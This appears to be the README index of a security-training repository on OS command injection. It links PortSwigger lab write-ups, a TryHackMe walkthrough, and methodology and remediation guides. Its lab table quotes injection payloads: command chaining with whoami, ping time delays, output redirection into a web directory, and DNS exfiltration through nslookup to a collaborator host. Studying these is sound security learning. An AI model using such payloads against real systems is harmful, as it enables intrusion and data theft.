# OS Command Injection Labs (EN)

[![Category](https://img.shields.io/badge/Category-OS%20Command%20Injection-red)]()
[![Labs](https://img.shields.io/badge/PortSwigger%20Labs-5%20Labs-blue)]()
[![THM](https://img.shields.io/badge/TryHackMe-Walkthrough-orange)]()

Welcome to the English documentation for **OS Command Injection (CWE-78)**. This directory covers the full spectrum of command injection vulnerabilities: in-band verbose execution, blind time delays, blind output redirection, and out-of-band data exfiltration via DNS lookups.

---

## 📚 Core Documents

| Document | Description |
|---|---|
| [📖 OVERVIEW.md](./OVERVIEW.md) | Theoretical breakdown: Shell metacharacters, execution types, and chaining techniques. |
| [🧠 METHODOLOGY.md](./METHODOLOGY.md) | Pentester Mindset: Attack surface discovery, filter bypasses, and response verification. |
| [🔍 ROOT-CAUSE.md](./ROOT-CAUSE.md) | Root cause analysis: Shell spawning vs direct exec, and string concatenation flaws. |
| [🛡️ REMEDIATION.md](./REMEDIATION.md) | Secure coding: Parameterized process execution without shells (Python/Node.js). |
| [🎯 THM-OS-Command-Injection.md](./THM-OS-Command-Injection.md) | TryHackMe Command Injection practical room walkthrough. |

---

## 📋 Lab Writeup Index

| # | Lab Title | Injection Vector & Technique | Severity | Link |
|---|---|---|---|---|
| 01 | OS Command Injection, Simple Case | In-band / Verbose (`storeID=1\|whoami`) | Low | [Lab-01](./Lab-01-Simple-Case.md) |
| 02 | Blind OS Command Injection with Time Delays | Blind Time Delay (`email=x\|\|ping+-c+10+127.0.0.1\|\|`) | High | [Lab-02](./Lab-02-Blind-Time-Delays.md) |
| 03 | Blind OS Command Injection with Output Redirection | Blind File Redirection (`\|\|whoami>/var/www/images/out.txt\|\|`) | High | [Lab-03](./Lab-03-Blind-Output-Redirection.md) |
| 04 | Blind OS Command Injection with Out-of-Band Interaction | Blind OOB DNS Trigger (`\|\|nslookup+x.collab\|\|`) | High | [Lab-04](./Lab-04-Blind-OOB-Interaction.md) |
| 05 | Blind OS Command Injection with Out-of-Band Data Exfiltration | Dynamic DNS Exfiltration (``\|\|nslookup+`whoami`.collab\|\|``) | Critical | [Lab-05](./Lab-05-Blind-OOB-Data-Exfiltration.md) |
